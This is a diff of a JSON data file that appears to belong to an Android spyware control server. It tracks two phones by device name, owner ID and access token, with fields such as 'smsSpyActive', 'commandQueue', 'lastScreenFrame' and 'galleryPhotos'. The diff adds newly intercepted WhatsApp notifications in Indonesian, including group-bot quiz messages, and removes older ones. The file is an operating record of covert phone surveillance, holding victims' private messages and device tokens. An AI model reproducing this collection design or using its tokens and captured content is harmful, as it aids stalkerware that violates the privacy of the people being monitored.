@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775045960009,
+    "lastSeen": 1775045969035,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15752 pesan dari 10 chat",
+        "time": "01/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045960355
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13552 pesan): ~ Bot",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:08",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045312076
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15631 pesan dari 10 chat",
-        "time": "01/04 20:08",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045311606
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775045959024,
+    "lastSeen": 1775045967714,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15752 pesan dari 10 chat",
+        "time": "01/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045960337
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13552 pesan): ~ Bot",
+        "content": "✅ Jawaban Benar! \nJawabannya adalah: pecah peperangan\n\nSelamat kepada @⁨~mika⁩! 🎉\n🎁 Kamu mendapatkan hadiah +4 Limit Bot!",
+        "time": "01/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045960245
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8048,22 +8064,6 @@
         "time": "01/04 20:08",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045312088
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13405 pesan): ~ Bot",
-        "content": "🎉 Berhasil claim 5 limit tambahan!\n> upgrade ke premium untuk akses tanpa batas",
-        "time": "01/04 20:08",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045311620
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15631 pesan dari 10 chat",
-        "time": "01/04 20:08",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045311527
       }
     ],
     "galleryPhotos": [],
